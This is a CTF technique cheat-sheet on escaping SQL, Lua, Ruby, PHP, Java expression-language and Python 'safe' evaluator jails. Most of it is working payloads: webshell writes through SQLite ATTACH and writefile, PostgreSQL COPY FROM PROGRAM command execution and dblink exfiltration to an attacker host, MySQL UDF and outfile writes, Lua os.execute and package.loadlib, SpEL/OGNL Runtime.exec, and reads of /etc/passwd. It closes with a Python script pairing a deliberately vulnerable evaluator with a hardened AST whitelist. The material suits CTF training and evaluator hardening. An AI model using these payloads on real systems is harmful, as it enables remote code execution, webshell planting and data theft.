---
title: "SQL and DSL Jails - Calculator and Eval Challenges"
category: misc
subcategory: eval-jail
type: technique
tags: [eval-jail, sql-jail, sqlite, postgres, mysql, lua-sandbox, ruby-eval, php-jail, spel, ognl, expression-language, literal-eval, simpleeval, ast-whitelist, jail-escape, sandbox-escape]
difficulty: medium
summary: "Enumerate the DSL's grammar, find a primitive (file read, file write, module load, host call), then chain it to code execution."
when_to_use:
  - "You get to run exactly one SQL query, Lua chunk, or template expression"
  - "A 'safe' calculator claims to only evaluate arithmetic"
  - "The service uses ast.literal_eval, simpleeval, or a custom AST whitelist"
  - "You control a SpEL/OGNL/JEXL expression in a Java app"
tools: [sqlite3, psql, mysql, lua, python3, ruby, php]
related: [python-jail-escape, python-jail-restricted-chars, js-sandbox-escape, jail-escape-payloads, hunt-sqli, ctf-general-cheatsheet]
---

## TL;DR

Every DSL jail is the same three steps: **map the grammar** (what functions/keywords does the
engine accept?), **find a primitive** (read a file, write a file, load a module, call a host
function), **chain to the goal** (usually the flag file, sometimes a shell). A calculator that
allows one function call is already a file read away from done.

## Recognise it

- "Enter a query" / "Enter an expression" with a single round trip.
- The prompt echoes an engine-specific error (`sqlite3.OperationalError`,
  `SpelEvaluationException`, `attempt to call a nil value`).
- Source shows `eval()`, `ast.literal_eval()`, `simpleeval`, `Kernel#eval`, `load()`,
  `db.execute(user_input)`.
- The output of your expression is returned to you, which gives you an oracle to enumerate with.

## Step 1 - map the grammar

Always fingerprint before attacking:

```sql
-- which SQL engine?
SELECT sqlite_version();          -- SQLite
SELECT version();                 -- PostgreSQL / MySQL (different formats)
SELECT @@version;                 -- MySQL / MSSQL
SELECT banner FROM v$version;     -- Oracle
```

```lua
-- which Lua, and what is in _ENV?
print(_VERSION)
for k,v in pairs(_ENV) do print(k, type(v)) end
```

```python
# what does the python evaluator accept?
dir()
[x for x in dir(__builtins__)]
type(1).__mro__
```

## SQLite jails

SQLite is the most common "run one query" jail because it is embedded in the challenge process.

```sql
-- metadata: what tables exist
SELECT name, sql FROM sqlite_master;
SELECT * FROM pragma_table_info('flags');

-- file READ (only if the build enables it - CLI does, python's sqlite3 usually does not)
SELECT readfile('/flag');
SELECT hex(readfile('/flag'));

-- file WRITE
SELECT writefile('/tmp/x', 'content');
SELECT writefile('/var/www/html/s.php', '<?php system($_GET[0]);?>');

-- ATTACH creates a database file anywhere you can write, with content you control
ATTACH DATABASE '/var/www/html/shell.php' AS s;
CREATE TABLE s.t (c TEXT);
INSERT INTO s.t VALUES ('<?php system($_GET[0]); ?>');

-- load_extension is arbitrary code execution (usually disabled)
SELECT load_extension('/tmp/evil.so');

-- string/char building when quotes are filtered
SELECT char(47,102,108,97,103);          -- '/flag'
SELECT CAST(x'2f666c6167' AS TEXT);      -- hex literal

-- the Python sqlite3 module also exposes user functions the app registered:
SELECT some_registered_function('...');  -- look at the challenge source for create_function()
```

## PostgreSQL

```sql
-- command execution when you are superuser
COPY t FROM PROGRAM 'id';
CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'cat /flag'; SELECT * FROM cmd;

-- file read/write
COPY t FROM '/etc/passwd';
COPY (SELECT 'x') TO '/tmp/out';
SELECT pg_read_file('/etc/passwd');
SELECT pg_ls_dir('/');
SELECT lo_import('/etc/passwd');

-- code execution through an untrusted procedural language
CREATE EXTENSION plpythonu;
CREATE FUNCTION f() RETURNS text AS $$ import os; return os.popen('id').read() $$ LANGUAGE plpythonu;

-- dblink / large objects for exfiltration
SELECT * FROM dblink('host=attacker user=x','SELECT 1') AS t(x int);
```

## MySQL / MariaDB

```sql
SELECT LOAD_FILE('/etc/passwd');                 -- needs FILE privilege + secure_file_priv
SELECT 'x' INTO OUTFILE '/var/www/html/s.php';
SELECT 0x3c3f706870... INTO DUMPFILE '/tmp/udf.so';   -- the classic UDF path
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT user(), current_user(), @@datadir;
```

## Lua sandboxes

```lua
-- what escaped into the environment?
for k,v in pairs(_G) do print(k) end
print(os, io, package, load, loadstring, require, dofile)

-- direct execution
os.execute("/bin/sh")
io.popen("id"):read("*a")

-- when os/io are nil, go through package
package.loadlib("/lib/x86_64-linux-gnu/libc.so.6", "system")("id")
require("os").execute("id")

-- load()/loadstring() compiles a new chunk with a chosen environment
load("return 1+1")()
load(string.dump(function() end))            -- bytecode loading: a classic sandbox break
-- Lua 5.1 loadstring with bytecode can corrupt memory; 5.2+ has `mode` to block it

-- metatable escape: getmetatable("").__index is the string library
getmetatable("").__index.rep                  -- reachable from any string
getmetatable("").__index = {}                 -- or poison it so host code calls your function

-- _ENV manipulation (5.2+)
local f = load("return os", nil, "t", {os = os})
```

## Ruby

```ruby
`id`                                    # backticks
%x(id)
system("id")
exec("id")
IO.popen("id").read
Kernel.send(:system, "id")
Object.const_get(:Kernel).send(:`, "id")
eval(File.read("/flag"))
ObjectSpace.each_object(Class) { |c| puts c }     # find a class with a useful method
File.read("/flag")
```

## PHP

```php
system($_GET[0]); passthru(); shell_exec(); exec(); popen(); proc_open();
`id`;                                   // backticks
eval($_POST['c']);
assert($_GET['c']);                     // PHP < 8
create_function('', $code);             // PHP < 8
preg_replace('/x/e', $code, 'x');       // PHP < 7, the /e modifier
include('data://text/plain;base64,...');
include('php://input');
// letter-free webshell: build function names from XOR of non-alphanumeric strings
$_=('['^'+').('!'^'+');                 // arbitrary characters via string XOR
// disable_functions bypasses: LD_PRELOAD via mail()/putenv, FFI, imap_open, dl()
```

## Java expression languages (SpEL, OGNL, JEXL, MVEL)

```text
# SpEL (Spring)
T(java.lang.Runtime).getRuntime().exec('id')
new java.lang.ProcessBuilder(new String[]{'/bin/sh','-c','id'}).start()
''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)

# OGNL (Struts, Confluence)
(#a=@java.lang.Runtime@getRuntime().exec('id'))
@java.lang.Runtime@getRuntime().exec('id')

# JEXL
''.class.forName('java.lang.Runtime')

# when 'Runtime' is blacklisted, use ProcessBuilder, ScriptEngineManager, or
# javax.script: new javax.script.ScriptEngineManager().getEngineByName('js').eval(...)
```

## Python "safe" evaluators

```python
import ast
ast.literal_eval("1+1")        # works (BinOp on constants is allowed in modern versions)
ast.literal_eval("[1,2,{3:4}]")# works
ast.literal_eval("open('/x')") # ValueError - only literals
```

`ast.literal_eval` is genuinely safe for *evaluation*, but it is **not** safe against
resource exhaustion: a deeply nested literal (`[[[[...]]]]`) can blow the C stack, and a huge
integer literal (`9**9**9` is rejected, but `10**100000` written out as digits) costs memory.

`simpleeval` and hand-rolled AST whitelists fail when they forget a node type:

- `ast.Attribute` allowed -> `().__class__` -> full pyjail.
- `ast.Subscript` on a builtin allowed -> `{}.__class__`.
- f-strings (`ast.JoinedStr`/`FormattedValue`) allowed -> arbitrary expressions inside.
- Comprehensions (`ast.ListComp`) allowed -> a loop, and with a walrus, assignment.
- `ast.Call` allowed on a whitelist of *names* but the names are resolved at runtime from a
  dict you can influence.
- Operator overloading: `**` on huge ints is a DoS; `@` calls `__matmul__` on your object.

## Attack checklist

1. Fingerprint the engine and its version.
2. Dump the environment (`_G`, `dir()`, `sqlite_master`, `SHOW VARIABLES`).
3. Look for a file-read primitive first - the flag is usually a file.
4. Then a file-write primitive (web root, cron dir, `~/.ssh/authorized_keys`, a `.so` to load).
5. Then module loading / host function calls.
6. If output is not returned, build a boolean or timing oracle and exfiltrate bit by bit.

## Code

```python
#!/usr/bin/env python3
"""Two things: a demonstration of why a naive 'safe' evaluator is not safe, and an
AST whitelist checker that is actually defensible.

  python3 evaljail.py check "1+2*3"
  python3 evaljail.py check "().__class__"
  python3 evaljail.py --selftest
"""
from __future__ import annotations

import ast
import operator
import sys

# Only these node types may appear anywhere in the tree.
SAFE_NODES: set[type] = {
    ast.Expression, ast.Constant, ast.Tuple, ast.List, ast.Dict, ast.Set,
    ast.BinOp, ast.UnaryOp, ast.BoolOp, ast.Compare,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod,
    ast.USub, ast.UAdd, ast.Not, ast.And, ast.Or,
    ast.Eq, ast.NotEq, ast.Lt, ast.LtE, ast.Gt, ast.GtE,
    ast.Load,
}

BIN_OPS = {
    ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul,
    ast.Div: operator.truediv, ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod,
}
UNARY_OPS = {ast.USub: operator.neg, ast.UAdd: operator.pos, ast.Not: operator.not_}
CMP_OPS = {
    ast.Eq: operator.eq, ast.NotEq: operator.ne, ast.Lt: operator.lt,
    ast.LtE: operator.le, ast.Gt: operator.gt, ast.GtE: operator.ge,
}

MAX_NODES = 200
MAX_DEPTH = 20
MAX_INT_DIGITS = 100


class Unsafe(Exception):
    pass


def check(expr: str) -> ast.Expression:
    """Parse and validate. Raises Unsafe with the reason."""
    if len(expr) > 1000:
        raise Unsafe("expression too long")
    try:
        tree = ast.parse(expr, mode="eval")
    except SyntaxError as e:
        raise Unsafe(f"syntax error: {e.msg}") from e

    count = 0
    for node in ast.walk(tree):
        count += 1
        if count > MAX_NODES:
            raise Unsafe("too many nodes")
        if type(node) not in SAFE_NODES:
            raise Unsafe(f"disallowed node: {type(node).__name__}")
        if isinstance(node, ast.Constant):
            if isinstance(node.value, int) and len(str(abs(node.value))) > MAX_INT_DIGITS:
                raise Unsafe("integer literal too large")
            if not isinstance(node.value, (int, float, complex, bool, str, type(None))):
                raise Unsafe(f"disallowed constant: {type(node.value).__name__}")

    def depth(n: ast.AST, d: int = 0) -> int:
        if d > MAX_DEPTH:
            raise Unsafe("expression nested too deeply")
        kids = list(ast.iter_child_nodes(n))
        return d if not kids else max(depth(k, d + 1) for k in kids)

    depth(tree)
    return tree


def safe_eval(expr: str):
    """Evaluate without ever calling eval/compile on user input."""
    tree = check(expr)

    def ev(node: ast.AST):
        if isinstance(node, ast.Expression):
            return ev(node.body)
        if isinstance(node, ast.Constant):
            return node.value
        if isinstance(node, ast.Tuple):
            return tuple(ev(e) for e in node.elts)
        if isinstance(node, ast.List):
            return [ev(e) for e in node.elts]
        if isinstance(node, ast.Set):
            return {ev(e) for e in node.elts}
        if isinstance(node, ast.Dict):
            return {ev(k): ev(v) for k, v in zip(node.keys, node.values)}
        if isinstance(node, ast.BinOp):
            fn = BIN_OPS.get(type(node.op))
            if fn is None:
                raise Unsafe(f"operator {type(node.op).__name__} not allowed")
            left, right = ev(node.left), ev(node.right)
            if isinstance(left, int) and isinstance(right, int):
                if abs(left) > 10 ** 30 or abs(right) > 10 ** 30:
                    raise Unsafe("operand too large")
            return fn(left, right)
        if isinstance(node, ast.UnaryOp):
            return UNARY_OPS[type(node.op)](ev(node.operand))
        if isinstance(node, ast.BoolOp):
            vals = [ev(v) for v in node.values]
            return all(vals) if isinstance(node.op, ast.And) else any(vals)
        if isinstance(node, ast.Compare):
            left = ev(node.left)
            for op, comp in zip(node.ops, node.comparators):
                right = ev(comp)
                if not CMP_OPS[type(op)](left, right):
                    return False
                left = right
            return True
        raise Unsafe(f"unhandled node {type(node).__name__}")

    return ev(tree)


# --- the naive version, for contrast --------------------------------------- #
NAIVE_BLACKLIST = ["import", "open", "exec", "eval", "os", "sys", "__"]
# The "helpful calculator" mistake: a few builtins are kept for convenience.
NAIVE_BUILTINS = {"abs": abs, "chr": chr, "getattr": getattr, "len": len,
                  "max": max, "min": min, "round": round, "str": str, "sum": sum}


def naive_eval(expr: str):
    """The pattern this technique exists to defeat. DO NOT use this for anything real."""
    if any(bad in expr for bad in NAIVE_BLACKLIST):
        raise Unsafe("blacklisted substring")
    return eval(expr, {"__builtins__": NAIVE_BUILTINS}, {})   # deliberately vulnerable


BYPASSES = [
    # (payload, which naive check it defeats)
    ("().__class__", "substring '__' - blocked, shown for contrast"),
    ("getattr((), chr(95)*2 + 'class' + chr(95)*2)", "builds the dunder name at runtime"),
    ("[].__class__.__base__.__subclasses__()", "the standard pyjail chain"),
    ("(lambda: 0).__globals__", "any function object exposes module globals"),
    ("f'{().__class__}'", "f-string hides attribute access from source-level filters"),
    ("9**9**9", "resource exhaustion, no code execution needed"),
    ("'a'*10**9", "memory exhaustion"),
]


def _selftest() -> None:
    # the safe evaluator computes arithmetic correctly
    assert safe_eval("1+2*3") == 7
    assert safe_eval("(4+6)/5") == 2.0
    assert safe_eval("2 < 3 <= 3") is True
    assert safe_eval("[1,2,3]") == [1, 2, 3]
    assert safe_eval("{'a': 1+1}") == {"a": 2}
    assert safe_eval("-7 % 3") == 2
    assert safe_eval("not (1 > 2)") is True

    # ... and rejects everything dangerous
    for bad, reason in [
        ("().__class__", "Attribute"),
        ("open('/etc/passwd')", "Call/Name"),
        ("__import__('os')", "Call/Name"),
        ("[x for x in [1]]", "comprehension"),
        ("f'{1}'", "f-string"),
        ("lambda: 1", "lambda"),
        ("a if b else c", "IfExp/Name"),
        ("x", "bare name"),
        ("(1).__class__", "Attribute"),
        ("{}[1]", "Subscript"),
        ("9**9", "Pow is not in the whitelist"),
        ("1" + "+1" * 300, "node budget"),
        ("[" * 30 + "]" * 30, "nesting depth"),
        ("1" * 200, "oversized integer literal"),
    ]:
        try:
            safe_eval(bad)
        except Unsafe:
            pass
        except (SyntaxError, RecursionError, MemoryError):
            pass
        else:
            raise AssertionError(f"safe_eval accepted {bad!r} ({reason})")

    # the naive evaluator is trivially bypassed
    try:
        naive_eval("().__class__")
    except Unsafe:
        pass   # the substring check catches this particular spelling
    else:
        raise AssertionError("expected the blacklist to fire")

    # but not this one: the dunder name is built at runtime
    got = naive_eval("getattr((), chr(95)*2 + 'class' + chr(95)*2)")
    assert got is tuple, got

    # ast.literal_eval boundaries
    assert ast.literal_eval("[1, 2, {'a': 3}]") == [1, 2, {"a": 3}]
    try:
        ast.literal_eval("open('/x')")
    except ValueError:
        pass
    else:
        raise AssertionError("literal_eval should reject a call")

    assert len(BYPASSES) >= 5
    print(f"selftest ok: safe_eval passes 7 cases and rejects 14, "
          f"naive_eval bypassed via getattr/chr, literal_eval boundary confirmed")


def main() -> int:
    if len(sys.argv) < 2 or sys.argv[1] == "--selftest":
        _selftest()
        return 0
    if sys.argv[1] == "check":
        try:
            print(safe_eval(sys.argv[2]))
        except Unsafe as e:
            print(f"rejected: {e}")
            return 1
    elif sys.argv[1] == "bypasses":
        for p, note in BYPASSES:
            print(f"{p:<48} {note}")
    else:
        print(__doc__)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## Variants and pitfalls

- **Read the challenge source.** DSL jails almost always ship their source; the registered
  functions and the exact blacklist are right there.
- **`readfile`/`writefile` are CLI-only in SQLite.** They are provided by the `fileio`
  extension that the `sqlite3` shell loads; Python's `sqlite3` module does not have them.
  `ATTACH DATABASE` works everywhere and is the portable write primitive.
- **`secure_file_priv` in MySQL** usually blocks `INTO OUTFILE` on modern installs; check it
  before wasting time.
- **PostgreSQL `COPY FROM PROGRAM` needs superuser** (or membership in `pg_execute_server_program`).
- **Lua `os` and `io` are often nil'ed but `package` is forgotten** - `package.loadlib` is
  direct native code execution.
- **AST whitelists that allow `ast.Attribute`** are not whitelists. One attribute access is a
  full escape.
- **Denial of service counts.** `9**9**9`, `'a'*10**9`, deep nesting, and catastrophic regex
  backtracking all work without any code execution, and some challenges score on availability.
- **Blind jails**: if the result is not echoed, use timing (`SELECT sleep(5)`,
  `pg_sleep`, a busy loop) or an out-of-band channel (DNS, HTTP, `dblink`).
- **Character filters stack**: an SQL jail that also blocks quotes needs `char()`/`CHR()`/hex
  literals - the same technique as `python-jail-restricted-chars`.

## Tools

`sqlite3`, `psql`, `mysql` clients for local reproduction; `python3 -c 'import ast;
print(ast.dump(ast.parse(...)))'` to see which node types a payload needs; the engine's own
documentation for the function list.

## References

- SQLite documentation: `ATTACH DATABASE`, `load_extension`, and the `fileio` extension that
  provides `readfile`/`writefile` - https://sqlite.org/lang_attach.html
- PostgreSQL documentation for `COPY ... FROM PROGRAM` and `pg_read_file`.
- MySQL documentation for `secure_file_priv`, `LOAD_FILE` and `INTO OUTFILE`.
- Python `ast` module documentation for `literal_eval` and the node types listed above.
